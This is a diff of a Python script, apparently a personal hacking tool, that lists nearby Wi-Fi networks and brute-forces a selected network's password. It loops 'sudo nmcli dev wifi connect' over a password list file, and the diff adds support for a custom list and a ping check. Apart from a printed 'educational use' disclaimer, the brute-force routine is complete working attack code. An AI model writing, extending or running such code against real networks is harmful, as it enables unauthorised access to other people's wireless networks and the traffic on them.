@@ -1,7 +1,8 @@
 import subprocess
 from time import sleep
 import os
-##### VARS #####
+
+
 ssid_list = []
 security_list = []
 
@@ -39,44 +40,48 @@ def lognetinfo():
         f.close()
         sleep(15)
 
-        
+def ping(url="google.com"):
+    result = subprocess.run(["ping", "-c", "1", url], stdout=subprocess.PIPE)
+    return result
 
-def bruteforce(ssid, password=""):
-    if password == "":
+def bruteforce(ssid, passwords=[""]):
+    if passwords[0] == "":
         with open('resources/passwordlist.txt', 'r') as f:
             codes = f.read().split('\n')
-        correct = False
-        correct_code = ""
-        try:
-            for i in range(len(codes)):
-                if correct:
-                    break
-                sleep(2)
-                result = subprocess.run(["sudo", "nmcli", "dev", "wifi", "connect", ssid, "password", codes[i]], stdout=subprocess.PIPE)
-                print(result)
-                if 'returncode=0' in str(result):
-                    print(f"correct password found: {codes[i]}")
-                    correct_code = codes[i]
-                    correct = True
-                    break
-
-                else:
-                    print("no")
-        except:
-            print("Error occured in bruteforcing")
-        finally:
-            print("Ending bruteforce")
+    else:
+        codes = passwords
+    correct = False
+    correct_code = ""
+    try:
+        for i in range(len(codes)):
             if correct:
-                print(f"The password of {ssid} is {correct_code}")
+                break
+            sleep(2)
+            result = subprocess.run(["sudo", "nmcli", "dev", "wifi", "connect", ssid, "password", codes[i]], stdout=subprocess.PIPE)
+            print(result)
+            if 'returncode=0' in str(result):
+                print(f"correct password found: {codes[i]}")
+                correct_code = codes[i]
+                correct = True
+                break
             else:
-                print('failed to bruteforce password')
+                print("no")
+    except:
+        print("Error occured in bruteforcing")
+    finally:
+        print("Ending bruteforce")
+        if correct:
+            print(f"The password of {ssid} is {correct_code}")
+        else:
+            print('failed to bruteforce password')
 
 def main():
     print("STARTED\nThis script is purely for educational use. Any consequenses or damages arising from the usage of it in an illegal or unethical way are purely the fault of the end-user, and in no way is the developer responsible for it.")
     print('''
 What do you want to do:
-1: Log SSIDs of all found networks to file
-2: Bruteforce a particular network
+1: Log SSIDs of all found WiFi networks to file
+2: Bruteforce a particular WiFi network
+3: Check internet access
 ''')
     option = int(input(">"))
     if option == 1:
@@ -88,6 +93,12 @@ What do you want to do:
             print(f"> {ssid_list[i]} < ({i})")
         selected_network = int(input("Enter number here: "))
         bruteforce(ssid_list[selected_network])
+    elif option == 3:
+        while True:
+            if input("press return to test pinging website, 'e' then return to exit: ") == "e":
+                break
+            else:
+                print(ping())
 
 if __name__ == '__main__':
     main()
